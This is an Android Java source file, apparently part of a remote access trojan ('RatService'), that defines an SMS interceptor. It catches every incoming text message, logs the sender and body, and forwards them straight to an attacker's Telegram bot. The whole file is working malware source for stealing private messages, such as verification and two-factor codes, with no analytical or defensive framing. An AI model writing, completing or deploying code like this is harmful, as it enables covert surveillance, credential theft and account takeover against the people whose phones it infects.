package com.my.luck.features;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.provider.Telephony;
import android.telephony.SmsMessage;
import android.util.Log;
import com.my.luck.core.RatService;

public class SmsInterceptor extends BroadcastReceiver {
    private static final String TAG = "SmsInterceptor";

    @Override
    public void onReceive(Context context, Intent intent) {
        if (Telephony.Sms.Intents.SMS_RECEIVED_ACTION.equals(intent.getAction())) {
            Bundle bundle = intent.getExtras();
            if (bundle != null) {
                Object[] pdus = (Object[]) bundle.get("pdus");
                if (pdus != null) {
                    for (Object pdu : pdus) {
                        SmsMessage sms = SmsMessage.createFromPdu((byte[]) pdu);
                        String sender = sms.getDisplayOriginatingAddress();
                        String body = sms.getMessageBody();
                        
                        Log.d(TAG, "SMS intercepted: " + sender + " - " + body);
                        
                        // Forward to Telegram immediately
                        if (context instanceof RatService) {
                            RatService service = (RatService) context;
                            if (service.getTelegramBot() != null) {
                                service.getTelegramBot().alertNewSms(sender, body);
                            }
                        }
                    }
                }
            }
        }
    }
}